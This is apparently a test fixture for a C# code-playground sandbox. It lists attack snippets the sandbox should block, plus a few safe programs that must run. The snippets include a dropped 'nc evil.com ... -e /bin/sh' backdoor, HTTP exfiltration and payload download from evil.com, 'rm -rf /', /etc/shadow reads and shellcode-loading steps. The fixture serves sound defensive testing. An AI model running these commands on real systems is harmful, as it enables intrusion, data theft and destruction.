/**
 * C# Security Attack Vectors
 *
 * C# / .NET has a vast surface for attacks: process spawning, P/Invoke
 * (calling raw native code), unsafe blocks, reflection, Roslyn dynamic
 * compilation, deserialization gadgets, and AppDomain/AssemblyLoadContext
 * tricks. Binary / memory hacking is especially dangerous in C# because
 * the language exposes pointers, fixed buffers, stackalloc, and
 * Marshal.* APIs that can read/write arbitrary memory.
 *
 * Each test includes:
 * - name: Test identifier
 * - code: The malicious code attempt
 * - expectBlocked: Whether this should be blocked (true) or allowed (false)
 * - category: Attack category for grouping
 * - explanation: Human-readable description of how hackers use this attack
 */

export const csharpTests = [
  // ════════════════════════════════════════════════════════════════
  // COMMAND / PROCESS EXECUTION
  // ════════════════════════════════════════════════════════════════
  {
    name: 'C#: Process.Start (shell)',
    code: `using System.Diagnostics;
class Program {
  static void Main() {
    Process.Start("/bin/sh", "-c whoami");
  }
}`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 ATTACK: Direct Shell Command Execution

      How hackers use this:
      Process.Start is the .NET equivalent of Runtime.exec — it
      spawns native processes, including shells, with full access
      to the host operating system.

      Real-world impact:
      - Reverse shells and lateral movement
      - Read /etc/passwd, dump SSH keys
      - Pivot from web apps into internal networks
    `,
  },
  {
    name: 'C#: ProcessStartInfo + UseShellExecute',
    code: `using System.Diagnostics;
class Program {
  static void Main() {
    var psi = new ProcessStartInfo("cmd.exe", "/c dir") { UseShellExecute = true };
    Process.Start(psi);
  }
}`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 ATTACK: ProcessStartInfo Shell Spawn

      How hackers use this:
      ProcessStartInfo lets attackers control redirection, env
      variables, and credentials. With UseShellExecute=true the
      OS shell parses the argument string, enabling injection.
    `,
  },
  {
    name: 'C#: Process.Start with redirected stdout',
    code: `using System.Diagnostics;
class Program {
  static void Main() {
    var p = new Process();
    p.StartInfo = new ProcessStartInfo("cat", "/etc/shadow") { RedirectStandardOutput = true, UseShellExecute = false };
    p.Start();
    System.Console.WriteLine(p.StandardOutput.ReadToEnd());
  }
}`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 ATTACK: Stdout-Capturing Process Spawn

      How hackers use this:
      Capturing stdout from a spawned process lets attackers
      exfiltrate file contents (e.g., /etc/shadow, /etc/passwd)
      or output of system tools like 'id', 'whoami', 'env'.
    `,
  },
  {
    name: 'C#: Thread to bypass scanner',
    code: `using System.Threading;
class Program {
  static void Main() {
    new Thread(() => System.Diagnostics.Process.Start("rm", "-rf /")).Start();
  }
}`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 ATTACK: Threaded Command Execution

      How hackers use this:
      Wrapping Process.Start inside a new Thread can defeat naive
      string scanners and runs the command asynchronously so the
      caller returns "successfully" before the damage is detected.
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // FILE SYSTEM
  // ════════════════════════════════════════════════════════════════
  {
    name: 'C#: File.ReadAllText',
    code: `using System.IO;
class Program {
  static void Main() {
    System.Console.WriteLine(File.ReadAllText("/etc/passwd"));
  }
}`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 ATTACK: One-Liner File Theft

      How hackers use this:
      File.ReadAllText is the canonical way to slurp a sensitive
      file in C#. /etc/passwd, AWS credentials, kube configs, and
      private keys are all reachable with a single call.
    `,
  },
  {
    name: 'C#: File.WriteAllText backdoor',
    code: `using System.IO;
class Program {
  static void Main() {
    File.WriteAllText("/tmp/backdoor.sh", "#!/bin/sh\\nnc evil.com 4444 -e /bin/sh");
  }
}`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 ATTACK: Drop-A-Backdoor

      How hackers use this:
      File.WriteAllText is used to plant web shells, cron jobs,
      or systemd unit files for persistence. Combined with
      Process.Start it makes a full RCE chain.
    `,
  },
  {
    name: 'C#: FileStream raw read',
    code: `using System.IO;
class Program {
  static void Main() {
    using var fs = new FileStream("/etc/shadow", FileMode.Open);
  }
}`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 ATTACK: Low-Level FileStream

      How hackers use this:
      FileStream is the underlying class for all file I/O in
      .NET. Attackers use it for byte-level access — useful for
      reading binary secrets or writing crafted payloads.
    `,
  },
  {
    name: 'C#: StreamReader on path',
    code: `using System.IO;
class Program {
  static void Main() {
    using var r = new StreamReader("/etc/passwd");
    System.Console.WriteLine(r.ReadToEnd());
  }
}`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 ATTACK: StreamReader File Access

      How hackers use this:
      StreamReader is the most common way C# developers read
      text files — and the most common way attackers do, too.
    `,
  },
  {
    name: 'C#: Directory.GetFiles',
    code: `using System.IO;
class Program {
  static void Main() {
    foreach (var f in Directory.GetFiles("/", "*.key", SearchOption.AllDirectories))
      System.Console.WriteLine(f);
  }
}`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 ATTACK: Recursive Filesystem Recon

      How hackers use this:
      Directory.GetFiles with AllDirectories crawls the whole
      filesystem looking for *.key, *.pem, id_rsa, etc.
    `,
  },
  {
    name: 'C#: File.Delete',
    code: `using System.IO;
class Program {
  static void Main() {
    File.Delete("/var/log/auth.log");
  }
}`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 ATTACK: Log Tampering

      How hackers use this:
      Deleting log files is the textbook anti-forensics step
      after an intrusion. File.Delete and Directory.Delete are
      the entry points in .NET.
    `,
  },
  {
    name: 'C#: BinaryReader reads bytes',
    code: `using System.IO;
class Program {
  static void Main() {
    using var br = new BinaryReader(File.OpenRead("/etc/passwd"));
    var bytes = br.ReadBytes(1024);
  }
}`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 ATTACK: Binary File Reading

      How hackers use this:
      BinaryReader is preferred for non-text files such as
      keystores, password databases, and compiled assemblies.
    `,
  },
  {
    name: 'C#: MemoryMappedFile',
    code: `using System.IO.MemoryMappedFiles;
class Program {
  static void Main() {
    var mmf = MemoryMappedFile.CreateFromFile("/etc/passwd");
  }
}`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 ATTACK: Memory-Mapped File Access

      How hackers use this:
      MemoryMappedFile maps a file directly into memory, allowing
      zero-copy reads and writes. Used to bypass higher-level
      file API audit hooks.
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // NETWORK
  // ════════════════════════════════════════════════════════════════
  {
    name: 'C#: HttpClient exfiltration',
    code: `using System.Net.Http;
class Program {
  static void Main() {
    var c = new HttpClient();
    c.PostAsync("http://evil.com/x", new StringContent("secret")).Wait();
  }
}`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 ATTACK: HTTP Data Exfiltration

      How hackers use this:
      HttpClient is the modern .NET HTTP API. Attackers POST
      stolen data to attacker-controlled servers, masquerading
      as normal outbound traffic.
    `,
  },
  {
    name: 'C#: WebClient download',
    code: `using System.Net;
class Program {
  static void Main() {
    new WebClient().DownloadFile("http://evil.com/payload.exe", "/tmp/p");
  }
}`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 ATTACK: Remote Payload Download

      How hackers use this:
      WebClient.DownloadFile is the classic stage-2 dropper. The
      pattern "download then execute" is one of the most common
      RAT installation techniques in the wild.
    `,
  },
  {
    name: 'C#: TcpClient reverse shell',
    code: `using System.Net.Sockets;
class Program {
  static void Main() {
    var c = new TcpClient("evil.com", 4444);
  }
}`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 ATTACK: Raw TCP Reverse Shell

      How hackers use this:
      TcpClient establishes outbound TCP. Combined with
      Process.Start("/bin/sh") and stream redirection it
      becomes a full reverse shell.
    `,
  },
  {
    name: 'C#: TcpListener bind shell',
    code: `using System.Net;
using System.Net.Sockets;
class Program {
  static void Main() {
    var l = new TcpListener(IPAddress.Any, 9999);
    l.Start();
  }
}`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 ATTACK: Bind Shell Listener

      How hackers use this:
      TcpListener turns the compromised host into a server the
      attacker can reach later. Often used for persistence.
    `,
  },
  {
    name: 'C#: Socket primitive',
    code: `using System.Net.Sockets;
using System.Net;
class Program {
  static void Main() {
    var s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
    s.Connect(new IPEndPoint(IPAddress.Loopback, 22));
  }
}`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 ATTACK: Raw Socket Probe

      How hackers use this:
      Socket is the low-level primitive — perfect for port
      scanning the internal network from a compromised app.
    `,
  },
  {
    name: 'C#: Dns lookup',
    code: `using System.Net;
class Program {
  static void Main() {
    System.Console.WriteLine(Dns.GetHostEntry("evil.com").AddressList[0]);
  }
}`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 ATTACK: DNS Reconnaissance / DNS Exfiltration

      How hackers use this:
      DNS lookups are commonly allowed even where HTTP is
      blocked, making DNS a covert exfiltration channel.
    `,
  },
  {
    name: 'C#: SmtpClient mail relay',
    code: `using System.Net.Mail;
class Program {
  static void Main() {
    new SmtpClient("evil.com").Send("a@a", "b@b", "x", "y");
  }
}`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 ATTACK: SMTP Exfiltration

      How hackers use this:
      Sending mail through an attacker-controlled SMTP server
      is another covert exfiltration channel that bypasses
      common HTTP egress filters.
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // REFLECTION
  // ════════════════════════════════════════════════════════════════
  {
    name: 'C#: Type.GetType + Invoke',
    code: `class Program {
  static void Main() {
    var t = System.Type.GetType("System.Diagnostics.Process");
    t.GetMethod("Start", new[]{typeof(string)}).Invoke(null, new object[]{"id"});
  }
}`,
    expectBlocked: true,
    category: 'reflection',
    explanation: `
      🎯 ATTACK: Reflection-Based Command Execution

      How hackers use this:
      Reflection bypasses static analysis: the Process class is
      never named directly, only as a string. Many .NET malware
      families use this exact pattern to evade AV.
    `,
  },
  {
    name: 'C#: Activator.CreateInstance',
    code: `class Program {
  static void Main() {
    var t = System.Type.GetType("System.Net.WebClient");
    var c = System.Activator.CreateInstance(t);
  }
}`,
    expectBlocked: true,
    category: 'reflection',
    explanation: `
      🎯 ATTACK: Dynamic Object Construction

      How hackers use this:
      Activator.CreateInstance constructs objects from a Type
      reference — letting attackers instantiate WebClient,
      Process, or any other class without naming it in source.
    `,
  },
  {
    name: 'C#: Assembly.Load(byte[])',
    code: `using System.Reflection;
class Program {
  static void Main() {
    Assembly.Load(new byte[]{0x4d,0x5a});
  }
}`,
    expectBlocked: true,
    category: 'reflection',
    explanation: `
      🎯 ATTACK: In-Memory Assembly Injection

      How hackers use this:
      Assembly.Load(byte[]) loads a .NET assembly from a raw
      byte buffer, never touching disk. This is the foundation
      of fileless .NET malware and Cobalt Strike's "execute-
      assembly" technique.
    `,
  },
  {
    name: 'C#: Assembly.LoadFrom remote',
    code: `using System.Reflection;
class Program {
  static void Main() {
    Assembly.LoadFrom("http://evil.com/x.dll");
  }
}`,
    expectBlocked: true,
    category: 'reflection',
    explanation: `
      🎯 ATTACK: Remote Assembly Loading

      How hackers use this:
      LoadFrom can fetch assemblies over HTTP, downloading and
      executing arbitrary .NET code from an attacker server.
    `,
  },
  {
    name: 'C#: BindingFlags.NonPublic',
    code: `using System.Reflection;
class Program {
  static void Main() {
    var m = typeof(string).GetMethod("FastAllocateString", BindingFlags.Static|BindingFlags.NonPublic);
  }
}`,
    expectBlocked: true,
    category: 'reflection',
    explanation: `
      🎯 ATTACK: Private Member Reflection

      How hackers use this:
      BindingFlags.NonPublic exposes private/internal members,
      letting attackers call APIs that were never meant to be
      reachable, including security-sensitive internals.
    `,
  },
  {
    name: 'C#: DynamicMethod IL emission',
    code: `using System.Reflection.Emit;
class Program {
  static void Main() {
    var dm = new DynamicMethod("x", typeof(void), null);
    var il = dm.GetILGenerator();
  }
}`,
    expectBlocked: true,
    category: 'reflection',
    explanation: `
      🎯 ATTACK: Runtime IL Generation

      How hackers use this:
      Reflection.Emit / ILGenerator builds CIL bytecode at
      runtime — it's the C# equivalent of writing a JIT
      payload, and it's how many obfuscators hide payloads.
    `,
  },
  {
    name: 'C#: AppDomain access',
    code: `class Program {
  static void Main() {
    var d = System.AppDomain.CurrentDomain;
    foreach (var a in d.GetAssemblies()) System.Console.WriteLine(a.FullName);
  }
}`,
    expectBlocked: true,
    category: 'reflection',
    explanation: `
      🎯 ATTACK: AppDomain Enumeration

      How hackers use this:
      AppDomain reveals every loaded assembly — a great
      reconnaissance step for finding interesting types to
      reflect into.
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // ROSLYN / DYNAMIC CODE COMPILATION
  // ════════════════════════════════════════════════════════════════
  {
    name: 'C#: CSharpScript.EvaluateAsync',
    code: `using Microsoft.CodeAnalysis.CSharp.Scripting;
class Program {
  static void Main() {
    CSharpScript.EvaluateAsync("System.Diagnostics.Process.Start(\\"id\\")").Wait();
  }
}`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `
      🎯 ATTACK: Roslyn Scripting RCE

      How hackers use this:
      Microsoft.CodeAnalysis.CSharp.Scripting compiles and runs
      arbitrary C# at runtime. It is C#'s "eval()" and is a
      direct path to arbitrary code execution.
    `,
  },
  {
    name: 'C#: CSharpCodeProvider.CompileAssemblyFromSource',
    code: `using Microsoft.CSharp;
using System.CodeDom.Compiler;
class Program {
  static void Main() {
    var p = new CSharpCodeProvider();
    p.CompileAssemblyFromSource(new CompilerParameters(), "class X{}");
  }
}`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `
      🎯 ATTACK: Legacy CodeDom Compiler

      How hackers use this:
      The classic Microsoft.CSharp + CodeDom pipeline compiles
      C# from a string. It predates Roslyn but is still widely
      used by older PowerShell-style payloads.
    `,
  },
  {
    name: 'C#: dynamic + ExpandoObject',
    code: `using System.Dynamic;
class Program {
  static void Main() {
    dynamic e = new ExpandoObject();
    e.Run = (System.Action)(() => System.Diagnostics.Process.Start("id"));
    e.Run();
  }
}`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `
      🎯 ATTACK: DLR / dynamic Dispatch

      How hackers use this:
      The Dynamic Language Runtime resolves calls at runtime,
      defeating static analysis tools that look for known
      method invocations.
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // DESERIALIZATION
  // ════════════════════════════════════════════════════════════════
  {
    name: 'C#: BinaryFormatter.Deserialize',
    code: `using System.Runtime.Serialization.Formatters.Binary;
using System.IO;
class Program {
  static void Main() {
    var bf = new BinaryFormatter();
    bf.Deserialize(new MemoryStream(new byte[]{0}));
  }
}`,
    expectBlocked: true,
    category: 'serialization',
    explanation: `
      🎯 ATTACK: BinaryFormatter Deserialization (RCE)

      How hackers use this:
      BinaryFormatter is the .NET equivalent of Java's
      ObjectInputStream — it has been the source of countless
      RCE bugs (Microsoft has officially deprecated it as
      "dangerous"). YSoSerial.NET generates ready-to-use
      payloads for this very class.
    `,
  },
  {
    name: 'C#: SoapFormatter.Deserialize',
    code: `using System.Runtime.Serialization.Formatters.Soap;
using System.IO;
class Program {
  static void Main() {
    var f = new SoapFormatter();
    f.Deserialize(new MemoryStream(new byte[]{0}));
  }
}`,
    expectBlocked: true,
    category: 'serialization',
    explanation: `
      🎯 ATTACK: SOAP Deserialization

      How hackers use this:
      SoapFormatter has the same gadget-chain problem as
      BinaryFormatter and is exploited the same way.
    `,
  },
  {
    name: 'C#: ObjectStateFormatter (ViewState)',
    code: `using System.Web.UI;
class Program {
  static void Main() {
    new ObjectStateFormatter().Deserialize("AAEAAAD/////");
  }
}`,
    expectBlocked: true,
    category: 'serialization',
    explanation: `
      🎯 ATTACK: ASP.NET ViewState Deserialization

      How hackers use this:
      ObjectStateFormatter parses ASP.NET ViewState. When the
      machine key is leaked or weak, attackers craft ViewState
      payloads for full RCE — see CVE-2017-9248 and many more.
    `,
  },
  {
    name: 'C#: NetDataContractSerializer',
    code: `using System.Runtime.Serialization;
using System.IO;
class Program {
  static void Main() {
    new NetDataContractSerializer().Deserialize(new MemoryStream(new byte[]{0}));
  }
}`,
    expectBlocked: true,
    category: 'serialization',
    explanation: `
      🎯 ATTACK: NetDataContractSerializer Gadget Chain

      How hackers use this:
      NetDataContractSerializer embeds full type names in its
      output and resolves them on deserialize, making it a
      first-class RCE primitive.
    `,
  },
  {
    name: 'C#: TypeNameHandling abuse hint',
    code: `class Program {
  static void Main() {
    var s = "{\\"$type\\":\\"System.Diagnostics.Process\\"}";
    var t = Newtonsoft.Json.TypeNameHandling.All;
  }
}`,
    expectBlocked: true,
    category: 'serialization',
    explanation: `
      🎯 ATTACK: Json.NET TypeNameHandling RCE

      How hackers use this:
      When Json.NET is configured with TypeNameHandling != None,
      a "$type" property in JSON instantiates arbitrary types —
      a classic gadget chain into Process or other dangerous
      classes. Many real-world CVEs (e.g., CVE-2019-18935) hit
      this exact pattern.
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // BINARY / UNSAFE / NATIVE — the hacker's playground
  // ════════════════════════════════════════════════════════════════
  {
    name: 'C#: unsafe pointer write',
    code: `class Program {
  static unsafe void Main() {
    int x = 0;
    int* p = &x;
    *p = 0x41414141;
  }
}`,
    expectBlocked: true,
    category: 'unsafe_memory',
    explanation: `
      🎯 ATTACK: Unsafe Pointer Manipulation

      How hackers use this:
      'unsafe' blocks let C# manipulate raw pointers like C.
      Combined with stackalloc / fixed it enables stack
      smashing, ROP-style exploitation, and arbitrary memory
      read/write — the core of binary exploitation.
    `,
  },
  {
    name: 'C#: stackalloc buffer',
    code: `class Program {
  static unsafe void Main() {
    byte* buf = stackalloc byte[1024];
    for (int i = 0; i < 4096; i++) buf[i] = 0x90; // overflow!
  }
}`,
    expectBlocked: true,
    category: 'unsafe_memory',
    explanation: `
      🎯 ATTACK: Stack Buffer Overflow

      How hackers use this:
      stackalloc allocates on the stack with no bounds checks.
      Writing past the buffer end clobbers return addresses —
      classic stack smashing for native code execution.
    `,
  },
  {
    name: 'C#: fixed pointer pinning',
    code: `class Program {
  static unsafe void Main() {
    byte[] arr = new byte[8];
    fixed (byte* p = arr) {
      *(long*)p = 0xdeadbeef;
    }
  }
}`,
    expectBlocked: true,
    category: 'unsafe_memory',
    explanation: `
      🎯 ATTACK: Pinning + Type Punning

      How hackers use this:
      'fixed' pins managed memory and exposes it as a raw
      pointer. Casting to (long*) is type punning — used to
      bypass type safety and craft binary payloads.
    `,
  },
  {
    name: 'C#: Marshal.AllocHGlobal',
    code: `using System.Runtime.InteropServices;
class Program {
  static void Main() {
    var p = Marshal.AllocHGlobal(4096);
    Marshal.Copy(new byte[]{0x90,0x90,0xc3}, 0, p, 3);
  }
}`,
    expectBlocked: true,
    category: 'unsafe_memory',
    explanation: `
      🎯 ATTACK: Native Heap Shellcode Loader

      How hackers use this:
      Marshal.AllocHGlobal allocates unmanaged memory; Marshal.Copy
      copies bytes into it. Two more lines — VirtualProtect
      + GetDelegateForFunctionPointer — and you've executed
      shellcode in the .NET process. This is the classic
      "execute-shellcode-from-C#" recipe.
    `,
  },
  {
    name: 'C#: GCHandle.Alloc Pinned',
    code: `using System.Runtime.InteropServices;
class Program {
  static void Main() {
    var h = GCHandle.Alloc(new byte[16], GCHandleType.Pinned);
    var addr = h.AddrOfPinnedObject();
  }
}`,
    expectBlocked: true,
    category: 'unsafe_memory',
    explanation: `
      🎯 ATTACK: Pinned-Buffer Address Disclosure

      How hackers use this:
      GCHandle.Alloc(Pinned) prevents the GC from moving an
      object so a stable native pointer can be obtained — the
      precondition for passing buffers to P/Invoke shellcode.
    `,
  },
  {
    name: 'C#: Marshal.GetDelegateForFunctionPointer',
    code: `using System.Runtime.InteropServices;
class Program {
  static void Main() {
    var ptr = new System.IntPtr(0x12345678);
    var d = Marshal.GetDelegateForFunctionPointer<System.Action>(ptr);
  }
}`,
    expectBlocked: true,
    category: 'unsafe_memory',
    explanation: `
      🎯 ATTACK: Function-Pointer Hijack

      How hackers use this:
      GetDelegateForFunctionPointer turns any IntPtr into a
      callable delegate — point it at shellcode in
      AllocHGlobal'd memory and call it. Direct shellcode
      execution in pure .NET.
    `,
  },
  {
    name: 'C#: Span<byte> + stackalloc',
    code: `using System;
class Program {
  static void Main() {
    Span<byte> s = stackalloc byte[1024];
    s[0] = 0x41;
  }
}`,
    expectBlocked: true,
    category: 'unsafe_memory',
    explanation: `
      🎯 ATTACK: Span-Wrapped Stack Buffer

      How hackers use this:
      Span<byte> over stackalloc is the modern equivalent of a
      C buffer. Used in performance-critical code — and in
      memory-corruption exploits.
    `,
  },
  {
    name: 'C#: Unsafe.As reinterpret cast',
    code: `using System.Runtime.CompilerServices;
class Program {
  static void Main() {
    int x = 0;
    long y = Unsafe.As<int,long>(ref x);
  }
}`,
    expectBlocked: true,
    category: 'unsafe_memory',
    explanation: `
      🎯 ATTACK: Type-Punning via Unsafe.As

      How hackers use this:
      System.Runtime.CompilerServices.Unsafe.As reinterprets a
      managed reference as a different type — bypassing the
      type system entirely.
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // P/INVOKE / NATIVE CODE
  // ════════════════════════════════════════════════════════════════
  {
    name: 'C#: DllImport kernel32 LoadLibrary',
    code: `using System.Runtime.InteropServices;
class Program {
  [DllImport("kernel32.dll")] static extern System.IntPtr LoadLibrary(string n);
  static void Main() { LoadLibrary("evil.dll"); }
}`,
    expectBlocked: true,
    category: 'native_code',
    explanation: `
      🎯 ATTACK: Win32 LoadLibrary via P/Invoke

      How hackers use this:
      DllImport declares a P/Invoke binding to a native API.
      LoadLibrary loads attacker DLLs into the process — the
      first step of DLL hijacking and side-loading attacks.
    `,
  },
  {
    name: 'C#: DllImport libc system()',
    code: `using System.Runtime.InteropServices;
class Program {
  [DllImport("libc")] static extern int system(string c);
  static void Main() { system("id"); }
}`,
    expectBlocked: true,
    category: 'native_code',
    explanation: `
      🎯 ATTACK: libc system() via P/Invoke

      How hackers use this:
      P/Invoke into libc.system() executes shell commands on
      Linux. Bypasses all .NET-level command-execution audits
      because no managed Process API is touched.
    `,
  },
  {
    name: 'C#: DllImport VirtualAlloc',
    code: `using System.Runtime.InteropServices;
class Program {
  [DllImport("kernel32.dll")] static extern System.IntPtr VirtualAlloc(System.IntPtr a, uint s, uint t, uint p);
  static void Main() { VirtualAlloc(System.IntPtr.Zero, 4096, 0x1000, 0x40); }
}`,
    expectBlocked: true,
    category: 'native_code',
    explanation: `
      🎯 ATTACK: RWX Page for Shellcode

      How hackers use this:
      VirtualAlloc with PAGE_EXECUTE_READWRITE (0x40) carves
      out an executable region. Combined with WriteProcessMemory
      and CreateThread it is the canonical Windows shellcode
      injection sequence.
    `,
  },
  {
    name: 'C#: NativeLibrary.Load',
    code: `using System.Runtime.InteropServices;
class Program {
  static void Main() {
    NativeLibrary.Load("/tmp/evil.so");
  }
}`,
    expectBlocked: true,
    category: 'native_code',
    explanation: `
      🎯 ATTACK: Cross-Platform Native Loader

      How hackers use this:
      NativeLibrary.Load (added in .NET Core 3) loads a
      native shared library by path on any OS — modern
      replacement for LoadLibrary/dlopen P/Invokes.
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // CLASSLOADER / ASSEMBLY LOADING
  // ════════════════════════════════════════════════════════════════
  {
    name: 'C#: AssemblyLoadContext load',
    code: `using System.Runtime.Loader;
class Program {
  static void Main() {
    AssemblyLoadContext.Default.LoadFromAssemblyPath("/tmp/evil.dll");
  }
}`,
    expectBlocked: true,
    category: 'classloader',
    explanation: `
      🎯 ATTACK: AssemblyLoadContext Hijack

      How hackers use this:
      AssemblyLoadContext is the modern .NET assembly loader.
      Loading attacker DLLs into the default context lets them
      override existing types and run their code on first use.
    `,
  },
  {
    name: 'C#: AppDomain.CreateDomain',
    code: `class Program {
  static void Main() {
    var ad = System.AppDomain.CreateDomain("evil");
  }
}`,
    expectBlocked: true,
    category: 'classloader',
    explanation: `
      🎯 ATTACK: AppDomain Sandbox Escape

      How hackers use this:
      Creating a new AppDomain (legacy .NET Framework) with
      relaxed permissions has been a sandbox-escape technique
      since the very first .NET releases.
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // SYSTEM ACCESS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'C#: Environment.Exit DoS',
    code: `class Program {
  static void Main() {
    System.Environment.Exit(0);
  }
}`,
    expectBlocked: true,
    category: 'system_access',
    explanation: `
      🎯 ATTACK: Process Termination DoS

      How hackers use this:
      Environment.Exit kills the host process immediately,
      taking down the service for every other user — a denial
      of service via a single line.
    `,
  },
  {
    name: 'C#: Environment.GetEnvironmentVariables',
    code: `class Program {
  static void Main() {
    foreach (var k in System.Environment.GetEnvironmentVariables().Keys)
      System.Console.WriteLine(k);
  }
}`,
    expectBlocked: true,
    category: 'system_access',
    explanation: `
      🎯 ATTACK: Environment Variable Theft

      How hackers use this:
      Env vars commonly hold secrets: AWS_SECRET_ACCESS_KEY,
      DATABASE_URL, API tokens. Dumping them is one of the
      first things a real attacker does after initial access.
    `,
  },
  {
    name: 'C#: Registry.GetValue',
    code: `using Microsoft.Win32;
class Program {
  static void Main() {
    var v = Registry.GetValue("HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\X", "Y", null);
  }
}`,
    expectBlocked: true,
    category: 'system_access',
    explanation: `
      🎯 ATTACK: Windows Registry Read

      How hackers use this:
      The Windows registry holds credentials, install paths,
      and configuration. Microsoft.Win32.Registry is the
      direct .NET API to read and write it.
    `,
  },
  {
    name: 'C#: Environment.SetEnvironmentVariable',
    code: `class Program {
  static void Main() {
    System.Environment.SetEnvironmentVariable("PATH", "/tmp:/bin");
  }
}`,
    expectBlocked: true,
    category: 'system_access',
    explanation: `
      🎯 ATTACK: PATH Hijack

      How hackers use this:
      Overriding PATH causes subsequent process spawns to pick
      up a malicious binary the attacker dropped — the classic
      PATH-injection privilege-escalation pattern.
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // ENCODING BYPASS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'C#: Convert.FromBase64String → Assembly.Load',
    code: `using System.Reflection;
class Program {
  static void Main() {
    var b = System.Convert.FromBase64String("TVqQAAMAAAA=");
    Assembly.Load(b);
  }
}`,
    expectBlocked: true,
    category: 'encoding_bypass',
    explanation: `
      🎯 ATTACK: Base64-Encoded In-Memory Payload

      How hackers use this:
      Encoding the malicious assembly as base64 hides it from
      naive byte-pattern scanners. The runtime decodes and
      Assembly.Loads it from memory — fileless RCE.
    `,
  },
  {
    name: 'C#: BitConverter / hex decode',
    code: `class Program {
  static void Main() {
    var s = System.BitConverter.ToString(new byte[]{0x90,0x90,0xc3});
  }
}`,
    expectBlocked: true,
    category: 'encoding_bypass',
    explanation: `
      🎯 ATTACK: Hex-Encoded Payload Helper

      How hackers use this:
      BitConverter is often paired with Convert.FromHexString
      to smuggle shellcode bytes through string-only channels
      (logs, query strings, etc.).
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // SAFE CODE
  // ════════════════════════════════════════════════════════════════
  {
    name: 'C#: Safe print',
    code: `class Program {
  static void Main() {
    System.Console.WriteLine("Hello, World!");
  }
}`,
    expectBlocked: false,
    expectedOutput: 'Hello, World!',
    category: 'safe_code',
    explanation: `
      ✅ SAFE: Basic Console Output

      A textbook hello-world. This must run successfully so
      students can actually use the playground.
    `,
  },
  {
    name: 'C#: Safe math',
    code: `class Program {
  static void Main() {
    System.Console.WriteLine(2 + 2);
  }
}`,
    expectBlocked: false,
    expectedOutput: '4',
    category: 'safe_code',
    explanation: `
      ✅ SAFE: Basic Arithmetic

      Plain math with no side effects.
    `,
  },
  {
    name: 'C#: Safe class',
    code: `class Point {
  public int X, Y;
  public Point(int x, int y) { X = x; Y = y; }
  public int Sum() => X + Y;
}
class Program {
  static void Main() {
    var p = new Point(3, 4);
    System.Console.WriteLine(p.Sum());
  }
}`,
    expectBlocked: false,
    expectedOutput: '7',
    category: 'safe_code',
    explanation: `
      ✅ SAFE: OOP — class + constructor + method

      Standard object-oriented code with no dangerous APIs.
    `,
  },
  {
    name: 'C#: Safe LINQ',
    code: `using System.Linq;
class Program {
  static void Main() {
    var xs = new[]{1,2,3,4};
    System.Console.WriteLine(xs.Sum());
  }
}`,
    expectBlocked: false,
    expectedOutput: '10',
    category: 'safe_code',
    explanation: `
      ✅ SAFE: LINQ Aggregation

      System.Linq is pure data-transformation — no I/O, no
      reflection, no native code.
    `,
  },
  {
    name: 'C#: Safe top-level',
    code: `System.Console.WriteLine("top-level");`,
    expectBlocked: false,
    expectedOutput: 'top-level',
    category: 'safe_code',
    explanation: `
      ✅ SAFE: C# 9 Top-Level Statements

      Modern C# entry-point form — must be supported.
    `,
  },
];
